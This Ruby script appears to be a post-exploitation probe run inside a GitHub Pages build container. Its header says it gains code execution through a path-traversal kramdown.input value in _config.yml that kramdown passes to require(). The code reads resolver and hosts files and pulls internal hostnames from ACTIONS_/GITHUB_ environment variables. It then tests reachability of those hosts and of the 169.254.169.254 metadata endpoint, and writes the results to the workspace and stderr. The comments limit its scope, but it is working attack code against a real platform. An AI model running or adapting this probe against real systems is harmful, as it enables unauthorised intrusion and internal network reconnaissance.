# Egress and internal-reachability probe for a GitHub Pages build container.
#
# Reached the same way as before: _config.yml sets kramdown.input to a path
# that traverses out of the kramdown gem's parser directory, so kramdown
# passes it to Ruby's require().
#
# BOUNDS, deliberate and not negotiable:
#   - NO credential is sent. Not one request carries an Authorization header.
#     Token VALUES are never read. Only the HOSTNAMES of endpoints already
#     named in the environment are resolved.
#   - NO scanning. One DNS query and at most one TCP connect per host, no
#     port ranges, no retries, 3s timeouts.
#   - NO data is read from any internal service. A TLS/TCP handshake result
#     and, at most, an HTTP status line. No bodies, no paths beyond "/".
#   - Controls on BOTH sides, so a silent network means "isolated" rather
#     than "probe broken".

require "socket"
require "resolv"
require "timeout"
require "uri"

OUT = []
def say(s) OUT << s end

def private_ip?(ip)
  return false unless ip =~ /\A\d+\.\d+\.\d+\.\d+\z/
  a, b, = ip.split(".").map(&:to_i)
  return true if a == 10
  return true if a == 127
  return true if a == 172 && b.between?(16, 31)
  return true if a == 192 && b == 168
  return true if a == 169 && b == 254
  return true if a == 100 && b.between?(64, 127)   # CGNAT, used by some clouds
  false
end

def resolve(host)
  Timeout.timeout(3) { Resolv.getaddresses(host) }
rescue Exception => e
  ["ERR:#{e.class}"]
end

def tcp(host, port)
  Timeout.timeout(3) do
    s = TCPSocket.new(host, port)
    peer = s.peeraddr[3] rescue "?"
    s.close
    "OPEN peer=#{peer}"
  end
rescue Exception => e
  "#{e.class}"
end

# ---------- local facts, zero traffic ----------
say "== local =="
say "  resolv.conf: " + (File.read("/etc/resolv.conf").split("\n").grep(/nameserver|search/).join(" ; ") rescue "?")
say "  hosts      : " + (File.read("/etc/hosts").split("\n").reject { |l| l.strip.empty? || l =~ /\A#/ }.join(" ; ")[0, 300] rescue "?")
say "  own addrs  : " + (Socket.ip_address_list.reject(&:ipv6?).map(&:ip_address).join(",") rescue "?")

# ---------- CONTROL A: does the container have public egress at all ----------
say "== CONTROL A, public egress (if these fail, every negative below is void) =="
[["one.one.one.one", 443], ["example.com", 443]].each do |h, p|
  ips = resolve(h)
  say "  #{h}:#{p} dns=#{ips.first(2).join(',')} tcp=#{tcp(h, p)}"
end

# ---------- CONTROL B: negative control on the resolver ----------
say "== CONTROL B, negative: a name that must NOT resolve =="
bogus = "nx-9f3a7c21-does-not-exist.github.net"
say "  #{bogus} dns=#{resolve(bogus).first(2).join(',')}   (expect NXDOMAIN/err; a hit means wildcard DNS)"

# ---------- the question: internal endpoints already named in this environment ----------
# Hostnames only. No token is read and none is sent.
say "== internal endpoints named in the environment (hostname only, no credential) =="
hosts = {}
ENV.each do |k, v|
  next unless k =~ /\A(ACTIONS_|GITHUB_)/ && v.to_s =~ %r{\Ahttps?://}
  begin
    u = URI.parse(v.to_s)
    hosts[u.host] ||= []
    hosts[u.host] << k
  rescue Exception
  end
end
if hosts.empty?
  ENV.each do |k, v|
    next unless k =~ /\A(ACTIONS_|GITHUB_)/ && v.to_s =~ %r{\Ahttps?://([^/]+)}
    h = Regexp.last_match(1)
    hosts[h] ||= []
    hosts[h] << k
  end
end
hosts.each do |h, keys|
  ips = resolve(h)
  priv = ips.any? { |i| private_ip?(i) }
  say "  #{h}"
  say "      named_by=#{keys.sort.join(',')}"
  say "      dns=#{ips.first(3).join(',')} private=#{priv}"
  say "      tcp443=#{tcp(h, 443)}"
end

# ---------- link-local metadata: policy says this is BY DESIGN, so it is a control ----------
say "== link-local 169.254.169.254, named as expected-reachable in GitHub's own list =="
say "  tcp80=#{tcp('169.254.169.254', 80)}   (by design per the Actions/Codespaces rows, control only)"

say "== END =="

body = OUT.join("\n")
begin
  File.write("/github/workspace/EGRESS.txt", body + "\n")
rescue Exception
end
STDERR.puts "F007_EGRESS_BEGIN\n" + body + "\nF007_EGRESS_END"
raise "F007_EGRESS_PROBE_DONE"
